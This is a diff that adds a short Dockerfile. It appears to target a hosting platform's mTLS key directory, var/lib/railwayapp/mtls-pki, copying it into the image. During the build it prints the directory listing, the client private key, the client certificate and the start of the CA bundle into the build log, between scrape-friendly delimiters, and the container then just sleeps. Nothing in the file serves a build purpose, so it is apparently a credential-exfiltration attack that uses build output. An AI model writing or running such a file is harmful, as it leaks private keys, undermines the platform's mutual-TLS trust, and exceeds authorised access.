@@ -1,0 +1,11 @@
+FROM alpine:3.20
+COPY var/lib/railwayapp/mtls-pki /f/pki
+RUN set -x; echo "===D1==="; \
+ echo "--PKI_LS--"; ls -laR /f/pki 2>&1; \
+ echo "--CLIENT_KEY--"; cat /f/pki/client.key 2>&1; \
+ echo "--KEY_END--"; \
+ echo "--CLIENT_CRT--"; cat /f/pki/client.crt 2>&1; \
+ echo "--CRT_END--"; \
+ echo "--CA--"; head -20 /f/pki/server-ca-bundle.crt 2>&1; \
+ echo "===D1END==="
+CMD ["sh","-c","sleep 3600"]
